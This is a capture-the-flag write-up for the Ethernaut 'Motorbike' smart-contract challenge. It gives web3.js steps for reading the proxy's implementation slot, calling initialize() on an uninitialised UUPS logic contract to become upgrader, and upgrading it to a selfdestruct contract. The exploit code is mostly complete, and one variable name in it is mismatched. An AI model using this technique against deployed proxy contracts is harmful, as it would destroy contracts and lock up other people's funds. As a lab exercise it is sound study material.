# Selfdestruct contract "Engine"

This challenge contains 2 contract. `Motorbike` is a [upgradeable proxy](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) that delegate everything to the main logic on `Engine`.

Our logical flow for this challenge should be gaining access as `upgrader`, so we can `_authorizeUpgrade` and `upgradeToAndCall` to update our contract that contains `selfdestruct`. So in summary:
<br/>
a. Become `upgrader` <br/>
b. Deploy our `selfdestruct` contract<br/>
c. call `upgradeToAndCall` to upgrade our `selfdestruct`


Reading through contract we see that the it has a variable `_IMPLEMENTATION_SLOT` which is a constant storage slot. This is a [proxy standard](https://eips.ethereum.org/EIPS/eip-1967) method for avoiding clashes of storage.

## Section A
Our storage variables on `Engine` are actually stored in the proxy contract ([Link](https://iosiro.com/blog/openzeppelin-uups-proxy-vulnerability-disclosure)). Since the storage slot of the implementation is already a constant, we can just read the context in this slot directly to find out:
```
impAddy = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// Output a 32 byte address

impAddy = '0x' + implAddr.slice(-40)
// Remove and keep only the right most 20 byte of address
```

Now we have the contract address of `Engine`, we can directly call `initialize` by getting the first 4 bytes of the sha3 hash of the function:
```
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
// Get 4 bytes of sha3 hash

await web3.eth.sendTransaction({ from: player, to: impAddy, data: initializeData })
// Call the function
```
After calling `initialize` we set ourself as `upgrader`.

## Section B
Before this we should check if we are in fact the `upgrade`. Same as previous step we need to get the first 4 bytes of sha3 hash of the function:
```
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
// Get first 4 bytes 

await web3.eth.call({from: player, to: impAddy, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()
// Check if we are upgrader
```
After confirming, we can move on to deploy our contract with `selfdestruct` function and get the function's first 4 bytes of sha3 hash:
```
killEngine = "<YOUR_SELFDESTRUCT_CONTRACT_ADDRESS>"

killEngineData = web3.eth.abi.encodeFunctionSignature("kill()")
// encode the function name that you set of the contract that contains selfdestruct
```

## Section C
Once `selfdestruct` contract is set, we can finally call `upgradeToAndCall` to upgrade this as our latest proxy contract. 
```
upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}
// JSON interface object of function

upgradeParams = [killEngine, killEngineData]
// The parameters to encode

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
// call the function
```



